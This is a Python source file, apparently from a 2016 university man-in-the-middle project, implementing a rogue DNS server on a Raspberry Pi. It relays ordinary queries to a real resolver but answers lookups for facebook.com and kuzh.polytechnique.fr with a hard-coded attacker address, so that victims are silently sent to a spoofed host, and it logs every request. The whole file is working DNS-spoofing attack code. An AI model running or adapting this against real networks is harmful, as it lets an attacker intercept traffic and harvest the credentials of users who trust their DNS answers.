#! /usr/bin/env python


#####################################################
##                                                 ##
## Author: Alexis Thual && Victor Quach            ##
## Date: June 9, 2016                              ##
## Project: MITM (INF474X)                         ##
##                                                 ##
## Location:  RaspberryPi, /srv/dns.py             ##
## This is our DNS server. It fetches info from    ##
## a "real" DNS server, given in `dns_host`        ##
## and redirects useful addresses to `hack_ip`     ##
#####################################################



from dnslib import *
import socket
import datetime

own_port = 53
dns_port = 53
dns_host = "129.104.201.51"
hack_ip = "192.168.1.219"

logfile = open("/var/log/dns.log", 'a', 1)

server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind(("", own_port))

client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def dns_response(request):
    client_socket.sendto(request.pack(), (dns_host,dns_port))
    response, addr = client_socket.recvfrom(1024)
    return response

def get_label(request):
    return request.q.qname.label

def is_facebook(label):
    for truc in label:
        if truc.decode('ASCII') == 'facebook':
            return True
    return False

def is_kuzh(label):
    for truc in label:
        if truc.decode('ASCII') == 'kuzh':
            return True
    return False

def own_response(data):
    request = DNSRecord.parse(data)
    #logfile.write(str(datetime.now())
    logfile.write(str(request))
    print(request)

    label = get_label(request)

    if (is_facebook(label)) :
        reply = request.reply()
        reply.add_answer(RR("facebook.com",QTYPE.A,rdata=A(hack_ip),ttl=60))
        response = reply.pack()
    elif (is_kuzh(label)):
        reply = request.reply()
        reply.add_answer(RR("kuzh.polytechnique.fr",QTYPE.A,rdata=A(hack_ip),ttl=60))
        response = reply.pack()
    else:
        response = dns_response(request)

    return response


while 1:
    data, addr = server_socket.recvfrom(1024)
    response = own_response(data)
    server_socket.sendto(response,addr)
